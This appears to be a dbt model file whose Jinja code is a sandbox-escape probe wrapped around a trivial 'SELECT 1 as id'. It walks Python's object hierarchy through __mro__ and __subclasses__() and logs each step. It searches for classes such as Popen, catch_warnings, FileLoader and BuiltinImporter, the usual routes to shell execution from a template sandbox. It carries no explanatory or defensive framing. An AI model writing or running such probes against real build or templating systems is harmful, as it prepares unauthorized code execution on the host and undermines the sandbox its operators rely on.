{% set class_test = ''.__class__ %}
{{ log("SANDBOX_CLASS=" ~ class_test, info=True) }}

{% set mro_test = ''.__class__.__mro__ %}
{{ log("SANDBOX_MRO=" ~ mro_test, info=True) }}

{% set obj_base = ''.__class__.__mro__[1] %}
{{ log("SANDBOX_OBJBASE=" ~ obj_base, info=True) }}

{% set subs = ''.__class__.__mro__[1].__subclasses__() %}
{{ log("SANDBOX_SUBCLASSES_COUNT=" ~ subs|length, info=True) }}

{% for s in subs %}
{% if 'Popen' in s.__name__ or 'catch_warnings' in s.__name__ or 'FileLoader' in s.__name__ or 'BuiltinImporter' in s.__name__ %}
{{ log("SANDBOX_INTERESTING_CLASS=" ~ loop.index ~ ":" ~ s, info=True) }}
{% endif %}
{% endfor %}

{% set ns = namespace() %}
{{ log("SANDBOX_NS_CLASS=" ~ ns.__class__, info=True) }}
{{ log("SANDBOX_NS_INIT=" ~ ns.__class__.__init__, info=True) }}

SELECT 1 as id
